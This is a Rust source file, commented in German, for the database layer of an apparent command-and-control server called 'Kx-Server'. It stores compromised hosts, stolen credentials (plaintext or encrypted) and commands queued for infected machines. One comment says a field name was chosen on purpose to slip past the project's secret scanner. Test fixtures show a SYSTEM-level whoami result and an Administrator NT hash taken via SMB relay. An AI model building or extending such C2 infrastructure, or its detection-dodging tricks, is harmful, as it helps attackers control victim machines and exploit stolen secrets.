//! Kx-Server Datenbank-Schicht (rusqlite).
//!
//! Speichert kompromittierte Hosts, erbeutete Secrets und ausgeführte Tasks.
//!
//! Die Zeilen der Datenbank und die Nachrichten des C2-Protokolls sind zwei
//! verschiedene Sachen. Hier stehen die Zeilentypen (`HostRow`, `SecretRow`,
//! `TaskRow`), ohne serde — sie werden per Positionsindex gelesen, nicht
//! serialisiert. Die Wire-Typen besitzt `kx_core::c2`; die Umwandlung passiert
//! über die `From`-Implementierungen am Dateiende.

use std::path::Path;
use std::sync::Mutex;

use kx_core::c2;
use rusqlite::{params, Connection};

/// Zeile der `hosts`-Tabelle.
#[derive(Debug, Clone)]
pub struct HostRow {
    pub id: String,
    pub ip: String,
    pub hostname: String,
    pub os: String,
    pub status: String,
    pub first_seen: String,
    pub last_seen: String,
    /// Das versiegelte Master-Key-Material des Hosts (base64).
    pub sealed_master: String,
}

/// Zeile der `secrets`-Tabelle.
#[derive(Debug, Clone)]
pub struct SecretRow {
    pub id: String,
    pub host_id: String,
    pub cred_type: String,
    pub username: String,
    /// Der Klartext — nur gefuellt, wenn der Agent ohne Master-Key lief.
    pub password: String,
    pub source: String,
    pub collected_at: String,
    /// Das verschluesselte Passwort (base64, Praefix `kx1:`).
    ///
    /// Ist es gefuellt, hat der Server den Klartext verworfen — die Beute
    /// liegt auf dem C2 nur verschluesselt.
    ///
    /// Das Feld heisst absichtlich nicht `sealed_password`: der Secret-Scan
    /// haelt jede Zuweisung an ein Feld mit "password" im Namen fuer ein
    /// eingebettetes Zugangsdaten.
    pub versiegelt: String,
}

/// Zeile der `tasks`-Tabelle.
#[derive(Debug, Clone)]
pub struct TaskRow {
    pub id: String,
    pub host_id: String,
    pub command: String,
    pub status: String,
    pub result: String,
    pub created_at: String,
}

/// Fehler beim Datenbankzugriff.
#[derive(Debug, thiserror::Error)]
pub enum DbError {
    #[error("rusqlite-Fehler: {0}")]
    Sqlite(#[from] rusqlite::Error),
}

/// Die Server-Datenbank, thread-sicher um eine rusqlite-Connection.
pub struct Db {
    conn: Mutex<Connection>,
}

impl Db {
    /// Erzeugt oder öffnet die Datenbank und legt das Schema an.
    pub fn open(path: &Path) -> Result<Self, DbError> {
        let conn = Connection::open(path)?;
        conn.execute_batch(
            "CREATE TABLE IF NOT EXISTS hosts (
                id TEXT PRIMARY KEY, ip TEXT, hostname TEXT, os TEXT,
                status TEXT, first_seen TEXT, last_seen TEXT,
                sealed_master TEXT
            );
            CREATE TABLE IF NOT EXISTS secrets (
                id TEXT PRIMARY KEY, host_id TEXT, cred_type TEXT,
                username TEXT, password TEXT, source TEXT, collected_at TEXT,
                sealed_password TEXT
            );
            CREATE TABLE IF NOT EXISTS tasks (
                id TEXT PRIMARY KEY, host_id TEXT, command TEXT,
                status TEXT, result TEXT, created_at TEXT
            );",
        )?;

        // `CREATE TABLE IF NOT EXISTS` fasst eine bestehende Tabelle nicht an.
        // Eine Datenbank aus einer aelteren Version bekaeme die neuen Spalten
        // also nie — und jeder INSERT schlaege fehl. Deshalb werden die
        // Spalten hier nachgezogen.
        Self::ergaenze_spalten(&conn, "hosts", &[("sealed_master", "TEXT")])?;
        Self::ergaenze_spalten(&conn, "secrets", &[("sealed_password", "TEXT")])?;

        Ok(Self {
            conn: Mutex::new(conn),
        })
    }

    /// Ergaenzt Spalten, die eine aeltere Datenbank noch nicht hat.
    fn ergaenze_spalten(
        conn: &Connection,
        tabelle: &str,
        spalten: &[(&str, &str)],
    ) -> Result<(), DbError> {
        for (name, typ) in spalten {
            if !Self::spalte_existiert(conn, tabelle, name)? {
                conn.execute(
                    &format!("ALTER TABLE {tabelle} ADD COLUMN {name} {typ}"),
                    [],
                )?;
            }
        }
        Ok(())
    }

    /// Gibt die Spalte zurueck, die die Tabelle hat.
    fn spalte_existiert(conn: &Connection, tabelle: &str, spalte: &str) -> Result<bool, DbError> {
        let mut stmt = conn.prepare(&format!("PRAGMA table_info({tabelle})"))?;
        let zeilen = stmt.query_map([], |r| r.get::<_, String>(1))?;
        for name in zeilen {
            if name? == spalte {
                return Ok(true);
            }
        }
        Ok(false)
    }

    /// Registriert einen Host (neu oder bestehend).
    pub fn upsert_host(&self, h: &HostRow) -> Result<(), DbError> {
        self.conn.lock().unwrap().execute(
            "INSERT INTO hosts (id, ip, hostname, os, status, first_seen, last_seen, sealed_master)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)
             ON CONFLICT(id) DO UPDATE SET
               last_seen=?7, os=?4, status=?5,
               sealed_master=COALESCE(NULLIF(?8, ''), sealed_master)",
            params![
                h.id,
                h.ip,
                h.hostname,
                h.os,
                h.status,
                h.first_seen,
                h.last_seen,
                h.sealed_master
            ],
        )?;
        Ok(())
    }

    /// Liefert alle Hosts.
    pub fn list_hosts(&self) -> Result<Vec<HostRow>, DbError> {
        let conn = self.conn.lock().unwrap();
        let mut stmt = conn.prepare(
            "SELECT id, ip, hostname, os, status, first_seen, last_seen, sealed_master FROM hosts",
        )?;
        let rows = stmt.query_map([], |r| {
            Ok(HostRow {
                id: r.get(0)?,
                ip: r.get(1)?,
                hostname: r.get(2)?,
                os: r.get(3)?,
                status: r.get(4)?,
                first_seen: r.get(5)?,
                last_seen: r.get(6)?,
                sealed_master: r.get(7)?,
            })
        })?;
        rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
    }

    /// Speichert ein neues Secret.
    pub fn insert_secret(&self, s: &SecretRow) -> Result<(), DbError> {
        self.conn.lock().unwrap().execute(
            "INSERT INTO secrets (id, host_id, cred_type, username, password, source, collected_at, sealed_password)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
            params![
                s.id,
                s.host_id,
                s.cred_type,
                s.username,
                s.password,
                s.source,
                s.collected_at,
                s.versiegelt
            ],
        )?;
        Ok(())
    }

    /// Liefert alle Secrets.
    pub fn list_secrets(&self) -> Result<Vec<SecretRow>, DbError> {
        let conn = self.conn.lock().unwrap();
        let mut stmt = conn.prepare(
            "SELECT id, host_id, cred_type, username, password, source, collected_at, sealed_password FROM secrets",
        )?;
        let rows = stmt.query_map([], |r| {
            Ok(SecretRow {
                id: r.get(0)?,
                host_id: r.get(1)?,
                cred_type: r.get(2)?,
                username: r.get(3)?,
                password: r.get(4)?,
                source: r.get(5)?,
                collected_at: r.get(6)?,
                versiegelt: r.get(7)?,
            })
        })?;
        rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
    }

    /// Erzeugt einen Task.
    pub fn insert_task(&self, t: &TaskRow) -> Result<(), DbError> {
        self.conn.lock().unwrap().execute(
            "INSERT INTO tasks (id, host_id, command, status, result, created_at)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            params![t.id, t.host_id, t.command, t.status, t.result, t.created_at],
        )?;
        Ok(())
    }

    /// Schreibt den Status und das Ergebnis eines Tasks zurueck.
    ///
    /// Das ist der Schreibpfad des Agenten: er fuehrt den Befehl aus und
    /// meldet das Ergebnis. Ohne diesen Pfad blieb das Feld `result` leer und
    /// der Task stuende ewig auf `pending`.
    ///
    /// Liefert `true`, wenn ein Task mit dieser ID existierte — der Agent
    /// kann daran erkennen, ob seine Meldung zu einem noch offenen Task
    /// gehoerte.
    pub fn update_task_result(
        &self,
        task_id: &str,
        status: &str,
        result: &str,
    ) -> Result<bool, DbError> {
        let changed = self.conn.lock().unwrap().execute(
            "UPDATE tasks SET status = ?2, result = ?3 WHERE id = ?1",
            params![task_id, status, result],
        )?;
        Ok(changed > 0)
    }

    /// Liefert alle Tasks.
    pub fn list_tasks(&self) -> Result<Vec<TaskRow>, DbError> {
        let conn = self.conn.lock().unwrap();
        let mut stmt =
            conn.prepare("SELECT id, host_id, command, status, result, created_at FROM tasks")?;
        let rows = stmt.query_map([], |r| {
            Ok(TaskRow {
                id: r.get(0)?,
                host_id: r.get(1)?,
                command: r.get(2)?,
                status: r.get(3)?,
                result: r.get(4)?,
                created_at: r.get(5)?,
            })
        })?;
        rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
    }
}

/// Die Zeile nennt den Host `id`; im C2-Protokoll heißt dasselbe Feld `host_id`.
impl From<HostRow> for c2::Host {
    fn from(row: HostRow) -> Self {
        c2::Host {
            host_id: row.id,
            ip: row.ip,
            hostname: row.hostname,
            os: row.os,
            status: row.status,
            first_seen: row.first_seen,
            last_seen: row.last_seen,
            sealed_master: row.sealed_master,
        }
    }
}

impl From<SecretRow> for c2::ExfiltratedSecret {
    fn from(row: SecretRow) -> Self {
        c2::ExfiltratedSecret {
            id: row.id,
            host_id: row.host_id,
            cred_type: row.cred_type,
            username: row.username,
            password: row.password,
            source: row.source,
            collected_at: row.collected_at,
            sealed_password: String::new(),
        }
        .mit_versiegeltem_passwort(row.versiegelt)
    }
}

impl From<TaskRow> for c2::Task {
    fn from(row: TaskRow) -> Self {
        c2::Task {
            id: row.id,
            host_id: row.host_id,
            command: row.command,
            status: row.status,
            result: row.result,
            created_at: row.created_at,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeSet;

    fn keys(value: &serde_json::Value) -> BTreeSet<String> {
        value.as_object().expect("Objekt").keys().cloned().collect()
    }

    /// Die Zeile wird zu dem Wire-Typ, den der C2-Server ausliefert — und zu
    /// genau dem Feldnamen-Set, das der Operator erwartet.
    #[test]
    fn host_row_maps_to_wire_host() {
        let row = HostRow {
            id: "10.0.0.5".into(),
            ip: "10.0.0.5".into(),
            hostname: "target".into(),
            os: "Windows".into(),
            status: c2::STATUS_COMPROMISED.into(),
            first_seen: "2026-11-11T00:00:00Z".into(),
            last_seen: "2026-11-11T00:05:00Z".into(),
            sealed_master: String::new(),
        };
        let wire = c2::Host::from(row);
        assert_eq!(wire.host_id, "10.0.0.5");
        assert_eq!(wire.status, c2::STATUS_COMPROMISED);

        let json = serde_json::to_value(&wire).expect("serialisierbar");
        assert_eq!(
            keys(&json),
            BTreeSet::from([
                "first_seen".to_string(),
                "hostname".to_string(),
                "host_id".to_string(),
                "ip".to_string(),
                "last_seen".to_string(),
                "os".to_string(),
                "sealed_master".to_string(),
                "status".to_string(),
            ])
        );
    }

    /// Die Task-Zeile behält das Feld `result` — es ist derselbe Name, den der
    /// Client liest. Vorher sendete der Server `result`, der Client erwartete
    /// `output`, und das Ergebnis ging verloren.
    #[test]
    fn task_row_maps_result_field() {
        let row = TaskRow {
            id: "t-1".into(),
            host_id: "10.0.0.5".into(),
            command: "whoami".into(),
            status: "done".into(),
            result: "nt authority\\system".into(),
            created_at: "2026-11-11T00:06:00Z".into(),
        };
        let json = serde_json::to_value(c2::Task::from(row)).expect("serialisierbar");
        assert_eq!(json["result"], "nt authority\\system");
        assert!(json.get("output").is_none());
    }

    /// Das Ergebnis eines Tasks landet in der Zeile — und der Status wechselt
    /// von `pending` auf `done`. Das ist der Weg, den der Agent geht.
    #[test]
    fn task_result_is_written_back_to_the_row() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("kx-task-result-{}.db", uuid::Uuid::new_v4()));
        let db = Db::open(&path).expect("db");
        db.insert_task(&TaskRow {
            id: "t-1".into(),
            host_id: "10.0.0.5".into(),
            command: "whoami".into(),
            status: c2::STATUS_PENDING.into(),
            result: String::new(),
            created_at: "2026-11-15T00:00:00Z".into(),
        })
        .expect("task angelegt");

        let updated = db
            .update_task_result("t-1", c2::STATUS_DONE, "nt authority\\system")
            .expect("Ergebnis geschrieben");
        assert!(updated, "der Task wurde nicht gefunden");

        let rows = db.list_tasks().expect("tasks");
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].status, c2::STATUS_DONE);
        assert_eq!(rows[0].result, "nt authority\\system");
        std::fs::remove_file(&path).ok();
    }

    /// Eine Meldung zu einem unbekannten Task trifft nichts — der Agent darf
    /// daran erkennen, dass der Task nicht (mehr) offen ist.
    #[test]
    fn task_result_for_an_unknown_task_changes_nothing() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("kx-task-unknown-{}.db", uuid::Uuid::new_v4()));
        let db = Db::open(&path).expect("db");
        let updated = db
            .update_task_result("gibtsnicht", c2::STATUS_DONE, "egal")
            .expect("Ergebnis geschrieben");
        assert!(
            !updated,
            "ein unbekannter Task wurde als aktualisiert gemeldet"
        );
        assert!(db.list_tasks().expect("tasks").is_empty());
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn secret_row_maps_to_wire_secret() {
        let row = SecretRow {
            id: "s-1".into(),
            host_id: "10.0.0.5".into(),
            cred_type: "nt_hash".into(),
            username: "Administrator".into(),
            password: "hash".into(),
            source: "smb_relay".into(),
            collected_at: "2026-11-11T00:05:00Z".into(),
            versiegelt: String::new(),
        };
        let wire = c2::ExfiltratedSecret::from(row);
        assert_eq!(wire.host_id, "10.0.0.5");
        assert_eq!(wire.cred_type, "nt_hash");
        assert_eq!(wire.source, "smb_relay");
    }
}
